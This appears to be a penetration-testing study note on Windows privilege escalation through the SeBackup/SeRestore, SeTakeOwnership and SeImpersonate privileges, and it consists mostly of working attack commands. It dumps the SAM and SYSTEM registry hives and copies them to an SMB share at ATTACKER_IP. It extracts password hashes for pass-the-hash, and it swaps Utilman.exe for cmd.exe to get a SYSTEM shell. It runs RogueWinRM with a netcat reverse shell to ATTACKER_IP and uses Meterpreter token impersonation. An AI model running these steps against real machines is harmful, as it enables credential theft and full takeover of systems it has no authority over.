#### <mark style="background: #FF5582A6;">Exploiting SeBackup / SeRestore Privileges</mark>:

Privileges such as SeBackup and SeRestore are powerful as they allow users to read and write to any file on the system, bypassing DACL-based access controls. In this scenario, we'll leverage these privileges to extract sensitive information.

1. **<mark style="background: #BBFABBA6;">Extract Registry Hives</mark>:**
   
   ```batch
   C:\> reg save hklm\system C:\Users\accountname\system.hive
   C:\> reg save hklm\sam C:\Users\accountname\sam.hive
   ```

   By saving the SAM and SYSTEM registry hives, we can potentially extract valuable information, including password hashes.

2. **<mark style="background: #BBFABBA6;">Transfer Files to Attacker Machine</mark>:**

   Using Impacket's smbserver.py, we create a simple SMB server to facilitate file transfer.

   ```bash
   user@attackerpc$ mkdir share
   user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username useraccount -password passwordaccount sharedfolder thesharename
   ```

   On Windows Command Prompt, we copy the hive files to the attacker's machine.

   ```batch
   C:\> copy C:\Users\accountname\sam.hive \\ATTACKER_IP\public\
   C:\> copy C:\Users\accountname\system.hive \\ATTACKER_IP\public\
   ```

3. **<mark style="background: #BBFABBA6;">Retrieve Password Hashes</mark>:**

   We use Impacket's secretsdump.py to extract password hashes from the SAM and SYSTEM files.

   ```bash
   user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
   ```

   The output reveals hashed credentials, providing opportunities for a Pass-the-Hash attack.

#### <mark style="background: #FF5582A6;">Exploiting SeTakeOwnership Privilege</mark>:

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, opening avenues for privilege escalation.

1. **<mark style="background: #BBFABBA6;">Take Ownership of Utilman.exe</mark>:**

   ```batch
   C:\> takeown /f C:\Windows\System32\Utilman.exe
   ```

   Taking ownership grants us control over the file, a crucial step in the privilege escalation process.

2. **<mark style="background: #BBFABBA6;">Grant Full Permissions</mark>:**

   ```batch
   C:\> icacls C:\Windows\System32\Utilman.exe /grant ouraccount:F
   ```

   Granting full permissions ensures our control over Utilman.exe, paving the way for replacement.

3. **<mark style="background: #BBFABBA6;">Replace Utilman.exe with cmd.exe</mark>:**

   ```batch
   C:\Windows\System32\> copy cmd.exe utilman.exe
   ```

   By replacing Utilman.exe with cmd.exe, we set the stage for triggering a SYSTEM-level command prompt.

4. **<mark style="background: #BBFABBA6;">Trigger Utilman.exe for SYSTEM Shell</mark>:**

   Lock the screen and click on the "Ease of Access" button, which will execute our replaced `utilman.exe` with SYSTEM privileges.

#### <mark style="background: #FF5582A6;">Exploiting SeImpersonate / SeAssignPrimaryToken Privileges</mark>:

SeImpersonate and SeAssignPrimaryToken privileges enable a process to impersonate other users, providing opportunities for privilege escalation.

1. **<mark style="background: #BBFABBA6;">Upload RogueWinRM Exploit</mark>:**

   Assuming a compromised web application with the necessary privileges, we upload the RogueWinRM exploit.

2. **<mark style="background: #BBFABBA6;">Start Netcat Listener</mark>:**

   ```bash
   user@attackerpc$ nc -lvp 4442
   ```

   Preparing to receive a reverse shell once the exploit is triggered.

3. **<mark style="background: #BBFABBA6;">Trigger RogueWinRM Exploit</mark>:**

   ```batch
   C:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
   ```

   Executing the exploit, intercepting the BITS service connection, and preparing for SYSTEM-level access.

4. **<mark style="background: #BBFABBA6;">Receive SYSTEM Shell</mark>:**

   ```bash
   user@attackerpc$ nc -lvp 4442
   ```

   Receiving a shell with SYSTEM privileges, demonstrating successful exploitation.

Or using the **<mark style="background: #D2B3FFA6;">incognito</mark>** module in msfconsole: (Meterpreter Shell)

```bash
Introduction to Metasploit Incognito Module: Elevate privileges by manipulating Windows tokens.

- Load Incognito module:
  `load incognito` or `use incognito` if needed.

- List available tokens:
  `list_tokens -g`

- Impersonate Administrators token:
  `impersonate_token "BUILTIN\Administrators"`

- Check current user ID after impersonation:
  `getuid`

- Migrate to a process with proper permissions (e.g., services.exe):
  1. List processes: `ps`
  2. Migrate: `migrate PID-OF-PROCESS
```